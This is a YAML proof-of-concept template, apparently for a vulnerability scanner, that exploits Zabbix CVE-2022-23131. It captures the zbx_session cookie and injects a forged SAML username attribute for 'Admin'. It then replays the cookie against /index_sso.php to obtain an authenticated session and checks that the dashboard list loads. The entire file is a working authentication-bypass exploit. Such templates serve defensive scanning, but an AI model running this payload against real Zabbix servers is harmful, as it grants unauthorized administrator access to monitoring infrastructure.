name: yaml-poc-zabbix-zabbix-idor-CVE-2022-23131
binding: c6298aa3-0cf1-4b76-878d-96fd50d85bb8
detail:
    author: system_user
    links:
        - http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23131
        - https://nvd.nist.gov/vuln/detail/CVE-2022-23131
        - https://support.zabbix.com/browse/ZBX-20350
        - https://vigilance.fr/vulnerability/Zabbix-user-access-via-Client-side-Session-Storage-37253
        - https://www.cybersecurity-help.cz/vdb/SB2022022306
    vulnerability:
        id: 20d16d0f-4963-4c76-aa26-1ce5189a1ce9
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /
        expression: |
            response.status == 200 && response.headers["Set-Cookie"].contains("zbx_session")
        output:
            r0search: |
                "zbx_session=(?P<session>\\w+)".submatch(response.headers["Set-Cookie"])
            session: r0search["session"]
            sessionB64Decode: base64Decode(session)
            addSignedSession: replaceAll(sessionB64Decode, "{", "{\"saml_data\":{\"username_attribute\":\"Admin\"}, ")
            signedSessionB64Encode: base64(addSignedSession)
    r1:
        request:
            cache: true
            method: GET
            path: /index_sso.php
            headers:
                Cookie: zbx_session={{signedSessionB64Encode}}
            follow_redirects: false
        expression: |
            response.status == 302 && response.headers["Set-Cookie"].contains("zbx_session")
        output:
            r1search: |
                "zbx_session=(?P<sso_session>\\w+)".submatch(response.headers["Set-Cookie"])
            sso_session: r1search["sso_session"]
    r2:
        request:
            cache: true
            method: GET
            path: /zabbix.php?action=dashboard.list
            headers:
                Cookie: zbx_session={{sso_session}}
        expression: |
            response.status == 200 && response.body.bcontains(b"Dashboards</title>")
expression: r0() && r1() && r2()
